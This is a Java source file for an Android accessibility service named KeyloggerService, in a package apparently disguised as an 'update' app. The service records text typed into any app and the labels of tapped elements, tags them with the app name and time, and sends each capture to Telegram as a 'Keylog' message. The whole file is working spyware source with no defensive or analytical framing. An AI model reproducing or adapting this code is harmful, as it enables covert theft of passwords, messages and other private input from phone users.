package com.kasari.update;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {

private static String lastLoggedText = "";  
private static long lastLogTime = 0;  

@Override  
public void onAccessibilityEvent(AccessibilityEvent event) {  
    if (event == null) return;  
      
    try {  
        int eventType = event.getEventType();  
        CharSequence eventText = null;  
          
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {  
            List<CharSequence> texts = event.getText();
            if (texts != null && texts.size() > 0) {
                eventText = texts.get(0).toString();
            }
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {  
            AccessibilityNodeInfo source = event.getSource();  
            if (source != null) {  
                eventText = source.getText();  
                if (eventText == null || eventText.length() == 0) {  
                    eventText = source.getContentDescription();  
                }  
                source.recycle();  
            }  
        }  
          
        if (eventText != null && eventText.length() > 0) {  
            String text = eventText.toString().trim();  
            String packageName = event.getPackageName() != null ?   
                event.getPackageName().toString() : "unknown";  
              
            if (!text.isEmpty() && !text.equals(lastLoggedText) &&   
                (System.currentTimeMillis() - lastLogTime > 5000)) {  
                  
                lastLoggedText = text;  
                lastLogTime = System.currentTimeMillis();  
                  
                String timestamp = new SimpleDateFormat("HH:mm:ss",   
                    Locale.getDefault()).format(new Date());  
                  
                TelegramController.sendMessage(this,   
                    "⌨️ **Keylog** [" + packageName + "]\n" + text +   
                    "\n🕐 " + timestamp);  
            }  
        }  
          
    } catch (Exception e) {  
        e.printStackTrace();  
    }  
}  

@Override  
public void onInterrupt() {}  

@Override  
public void onServiceConnected() {  
    super.onServiceConnected();  
    AccessibilityServiceInfo info = new AccessibilityServiceInfo();  
    info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;  
    info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;  
    info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |   
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;  
    info.notificationTimeout = 100;  
    setServiceInfo(info);  
}

}